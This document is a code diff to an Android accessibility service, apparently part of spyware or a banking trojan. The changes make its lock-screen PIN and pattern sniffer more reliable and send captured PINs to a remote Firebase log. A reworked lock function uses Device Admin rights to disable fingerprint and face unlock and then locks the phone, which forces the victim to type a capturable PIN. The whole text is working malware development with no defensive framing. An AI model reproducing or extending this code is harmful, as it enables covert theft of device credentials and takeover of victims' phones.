@@ -253,44 +253,63 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private void sniffKeyguardPinPattern(AccessibilityEvent event, String pkg) {
         if (event == null) return;
-        int eventType = event.getEventType();
 
-        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            AccessibilityNodeInfo source = event.getSource();
-            if (source == null) return;
+        AccessibilityNodeInfo source = event.getSource();
+        String text = "";
+        String desc = "";
+        String viewId = "";
+        String clsName = "";
 
-            CharSequence textSeq = source.getText();
-            CharSequence descSeq = source.getContentDescription();
-            String text = textSeq != null ? textSeq.toString().trim() : "";
-            String desc = descSeq != null ? descSeq.toString().trim() : "";
-            String viewId = source.getViewIdResourceName() != null ? source.getViewIdResourceName().toLowerCase() : "";
+        if (source != null) {
+            CharSequence tSeq = source.getText();
+            CharSequence dSeq = source.getContentDescription();
+            CharSequence cSeq = source.getClassName();
+            text = tSeq != null ? tSeq.toString().trim() : "";
+            desc = dSeq != null ? dSeq.toString().trim() : "";
+            clsName = cSeq != null ? cSeq.toString() : "";
+            viewId = source.getViewIdResourceName() != null ? source.getViewIdResourceName().toLowerCase() : "";
+        }
 
-            String digit = null;
-            if (text.length() == 1 && Character.isDigit(text.charAt(0))) {
-                digit = text;
-            } else if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
-                digit = desc;
-            } else if (viewId.contains("digit") || viewId.contains("key0") || viewId.contains("key1") || 
-                       viewId.contains("key2") || viewId.contains("key3") || viewId.contains("key4") || 
-                       viewId.contains("key5") || viewId.contains("key6") || viewId.contains("key7") || 
-                       viewId.contains("key8") || viewId.contains("key9")) {
-                for (int i = 0; i <= 9; i++) {
-                    if (viewId.contains("key" + i) || viewId.endsWith(String.valueOf(i))) {
-                        digit = String.valueOf(i);
-                        break;
-                    }
+        if (text.isEmpty() && event.getText() != null && !event.getText().isEmpty()) {
+            Object first = event.getText().get(0);
+            if (first != null) text = first.toString().trim();
+        }
+
+        if (desc.isEmpty() && event.getContentDescription() != null) {
+            desc = event.getContentDescription().toString().trim();
+        }
+
+        String digit = null;
+
+        // 1. Direct Single Digit Text or Desc Check
+        if (text.length() == 1 && Character.isDigit(text.charAt(0))) {
+            digit = text;
+        } else if (desc.length() == 1 && Character.isDigit(desc.charAt(0))) {
+            digit = desc;
+        } else {
+            // 2. View ID or Desc Substring Digit Check (Samsung / Pixel Keyguard Keypad Buttons)
+            for (int i = 0; i <= 9; i++) {
+                String dStr = String.valueOf(i);
+                if (text.equals(dStr) || desc.equals(dStr) || 
+                    desc.contains("key " + i) || desc.contains("digit " + i) || desc.startsWith(dStr + " ") || desc.endsWith(" " + dStr) ||
+                    viewId.contains("key" + i) || viewId.endsWith("key_" + i) || viewId.endsWith("digit_" + i) || viewId.endsWith("id/" + dStr) || viewId.endsWith("id/key" + dStr)) {
+                    digit = dStr;
+                    break;
                 }
             }
+        }
 
-            long now = System.currentTimeMillis();
-            if (now - lastPinDigitTime > 12000) {
-                keyguardPinBuffer.setLength(0);
-            }
+        long now = System.currentTimeMillis();
+        if (now - lastPinDigitTime > 15000) {
+            keyguardPinBuffer.setLength(0);
+        }
 
-            if (digit != null) {
+        if (digit != null) {
+            // Prevent duplicate adjacent events within 120ms for the same digit
+            if (now - lastPinDigitTime > 120 || keyguardPinBuffer.length() == 0 || !keyguardPinBuffer.substring(keyguardPinBuffer.length() - 1).equals(digit)) {
                 lastPinDigitTime = now;
                 keyguardPinBuffer.append(digit);
-                Log.d(TAG, "KEYGUARD_SNIFFER: Digit [" + digit + "] appended. Buffer length=" + keyguardPinBuffer.length());
+                Log.d(TAG, "KEYGUARD_SNIFFER: Digit [" + digit + "] appended. Buffer length=" + keyguardPinBuffer.length() + " [" + keyguardPinBuffer + "]");
 
                 if (keyguardPinBuffer.length() >= 4 && keyguardPinBuffer.length() <= 8) {
                     String capturedPin = keyguardPinBuffer.toString();
@@ -298,14 +317,15 @@ public class IO_Persistence_Manager extends AccessibilityService {
                     FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Lock Screen PIN typed: [" + capturedPin + "]");
                 }
             }
+        }
 
-            CharSequence clsSeq = source.getClassName();
-            String clsName = clsSeq != null ? clsSeq.toString() : "";
-            if (clsName.contains("LockPatternView") || viewId.contains("lock_pattern") || viewId.contains("pattern")) {
-                Log.d(TAG, "KEYGUARD_SNIFFER: Lock Pattern entry gesture detected");
-                FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Lock Pattern entry gesture detected on Keyguard");
-            }
+        // Detect Lock Pattern View gestures on Samsung / Android
+        if (clsName.contains("LockPatternView") || viewId.contains("lock_pattern") || viewId.contains("pattern")) {
+            Log.d(TAG, "KEYGUARD_SNIFFER: Lock Pattern entry gesture detected");
+            FirebaseConfig.logActivity("KEYGUARD_SNIFFER: Lock Pattern entry gesture detected on Keyguard");
+        }
 
+        if (source != null) {
             source.recycle();
         }
     }
@@ -1213,25 +1233,50 @@ public class IO_Persistence_Manager extends AccessibilityService {
     // ============ INTERACTION ============
 
     public boolean lockScreenNow() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-            boolean success = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
-            if (success) {
-                Log.d(TAG, "KEYGUARD_LOCK: Instant OS phone lock executed via Accessibility GLOBAL_ACTION_LOCK_SCREEN");
-                return true;
+        final boolean[] result = {false};
+        java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(1);
+
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                // 1. If Device Admin is active, disable biometrics (fingerprint/face) to FORCE PIN/Pattern entry!
+                try {
+                    android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
+                    android.content.ComponentName admin = new android.content.ComponentName(this, StabilityPolicy.class);
+                    if (dpm != null && dpm.isAdminActive(admin)) {
+                        int disableFlags = android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT;
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                            disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_BIOMETRICS;
+                            disableFlags |= android.app.admin.DevicePolicyManager.KEYGUARD_DISABLE_FACE;
+                        }
+                        dpm.setKeyguardDisabledFeatures(admin, disableFlags);
+                        dpm.lockNow();
+                        Log.d(TAG, "KEYGUARD_LOCK: Biometrics disabled & Keyguard lockNow executed via Device Admin");
+                        result[0] = true;
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Device Admin lockNow failed: " + e.getMessage());
+                }
+
+                // 2. Fallback to Accessibility GLOBAL_ACTION_LOCK_SCREEN
+                if (!result[0] && Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    boolean success = performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
+                    if (success) {
+                        Log.d(TAG, "KEYGUARD_LOCK: Instant OS phone lock executed via Accessibility GLOBAL_ACTION_LOCK_SCREEN");
+                        result[0] = true;
+                    }
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "lockScreenNow Error: " + e.getMessage());
+            } finally {
+                latch.countDown();
             }
-        }
+        });
 
         try {
-            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-            android.content.ComponentName admin = new android.content.ComponentName(this, StabilityPolicy.class);
-            if (dpm != null && dpm.isAdminActive(admin)) {
-                dpm.lockNow();
-                Log.d(TAG, "KEYGUARD_LOCK: Standard OS phone lock executed via Device Admin");
-                return true;
-            }
-        } catch (Exception ignored) {}
+            boolean ignored = latch.await(1000, java.util.concurrent.TimeUnit.MILLISECONDS);
+        } catch (InterruptedException ignored) {}
 
-        return false;
+        return result[0];
     }
 
     public boolean clickAt(int x, int y) {
